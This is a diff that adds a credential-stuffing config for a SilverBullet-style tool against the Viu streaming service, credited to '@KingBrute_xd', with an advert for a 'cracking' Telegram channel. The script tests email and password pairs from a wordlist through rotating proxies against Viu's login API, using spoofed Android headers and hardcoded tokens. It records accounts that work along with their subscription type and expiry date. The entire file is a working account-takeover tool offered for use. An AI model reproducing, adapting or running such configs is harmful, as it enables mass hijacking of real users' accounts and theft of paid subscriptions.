@@ -1,0 +1,134 @@
+[SETTINGS]
+{
+  "Name": "Viu [ @KingBrute_xd ]",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-17T11:55:24.6092593+05:30",
+  "AdditionalInfo": "Join My Official Telegram Channel:- @NemesisCracking",
+  "RequiredPlugins": [],
+  "Author": "@KingBrute_xd",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Viu",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "aid" 
+
+FUNCTION Hash MD5 "<PASS>" -> VAR "ps" 
+
+REQUEST POST "https://um.viuapi.io/user/account" 
+  CONTENT "{\"password\":\"<ps>\",\"principal\":\"<USER>\",\"providerCode\":\"email\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "authorization: eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0.Ru_ZE9GA0kvBoWeaIxPQ3bMFZBq3DVbaayG5tdRA3LBtlrgUNjx-Lw.RsmxsCQHQuTGOs5oOjDOXQ.9S_XgFwLwVYwEvGs5HXIK4IrbTmV9m5lOJ6iTuzqaJ26tmRVjrdGxGurLvAJEawPf10JW3jcl1YdV9Rljxk_wVLH6CdomOgKH4ckaL40z6vcKpEGQV2R30ILmZwouQBi0p550b0x1QWef-xe3d_tpJsZ7RuGiK63BFugbTU-cmDSLdA4mQsJe967_g8l3tjiFeyV88yiHyXyjxLAVKAewzHztDXDgZV6b0YuDuqIURU.NNxldqhzZvlzUb0C4ymZ4w" 
+  HEADER "Host: um.viuapi.io" 
+  HEADER "accept: application/json" 
+  HEADER "x-client: android" 
+  HEADER "x-session-id: FQUjmJXPFgN7S1EB9JLi9MN7dHKV022P" 
+  HEADER "x-request-id: d7a662f0-87c2-49ca-9ae7-100b87bd85d9" 
+  HEADER "x-enable-drm-content: true" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "user-agent: okhttp/3.12.1" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "\"exists\":true" 
+    KEY "accountId" 
+  KEYCHAIN Failure OR 
+    KEY "errorMessage" 
+
+PARSE "<SOURCE>" REGEX "(?<={\"accountId\":\")(.*?)(?=\",\")" "[1]" -> VAR "cid" 
+
+REQUEST POST "https://um.viuapi.io/user/identity" 
+  CONTENT "{\"accountId\":\"<cid>\",\"deviceId\":\"<aid>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: um.viuapi.io" 
+  HEADER "accept: application/json" 
+  HEADER "x-client: android" 
+  HEADER "x-session-id: as07H1U0kXjqaFA7Jbg16ymNvGUrsIfo" 
+  HEADER "x-request-id: c1fc1fd4-7720-4116-9c25-9f856e1917f8" 
+  HEADER "x-enable-drm-content: true" 
+  HEADER "authorization: eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0.Ru_ZE9GA0kvBoWeaIxPQ3bMFZBq3DVbaayG5tdRA3LBtlrgUNjx-Lw.RsmxsCQHQuTGOs5oOjDOXQ.9S_XgFwLwVYwEvGs5HXIK4IrbTmV9m5lOJ6iTuzqaJ26tmRVjrdGxGurLvAJEawPf10JW3jcl1YdV9Rljxk_wVLH6CdomOgKH4ckaL40z6vcKpEGQV2R30ILmZwouQBi0p550b0x1QWef-xe3d_tpJsZ7RuGiK63BFugbTU-cmDSLdA4mQsJe967_g8l3tjiFeyV88yiHyXyjxLAVKAewzHztDXDgZV6b0YuDuqIURU.NNxldqhzZvlzUb0C4ymZ4w" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "user-agent: okhttp/3.12.1" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "tk" 
+
+FUNCTION RandomString "?n?n?n?n?n?n?n?n?n?n?n?n?n?n?n?n" -> VAR "id" 
+
+REQUEST GET "https://um.viuapi.io/viuapp-bff/my?appid=viu_android&ver=1.0&appver=1.1.7&fmt=json&platform=app&productId=1&iid=<id>&make=xiaomi&carrierid=0&model=Redmi%2BNote%2B8&devicetimezone=&devicecountry=&languageid=en&geo=2&regionid=hindi&ccode=IN&appsessid=&vuserid=<aid>&partner=Telkomsel&userid=<aid>&contentFlavour=hindi&networkType=wifi&deviceId=<id>&configVersion=1.0&languageId=en&partnerName=null" 
+  
+  HEADER "Host: um.viuapi.io" 
+  HEADER "authorization: <tk>" 
+  HEADER "x-session-id: FQUjmJXPFgN7S1EB9JLi9MN7dHKV022P" 
+  HEADER "accept: application/json" 
+  HEADER "x-client: android" 
+  HEADER "content-type: application/json" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "user-agent: okhttp/3.12.1" 
+
+PARSE "<SOURCE>" JSON "subscriptionType" CreateEmpty=FALSE -> CAP "Subscription" 
+
+PARSE "<SOURCE>" JSON "subscriptionEndDate" CreateEmpty=FALSE -> CAP "Expiry" 
+
+PARSE "<SOURCE>" JSON "Validity" CreateEmpty=FALSE -> CAP "Days Left" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<Days Left>" GreaterThan "0" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<Days Left>" EqualTo "0 Days" 
+
+FUNCTION Constant "@KingBrute_xd" -> CAP "Config By" 
+
+FUNCTION Constant "@NemesisCracking" -> CAP "Join My Official Telegram Channel" 
+
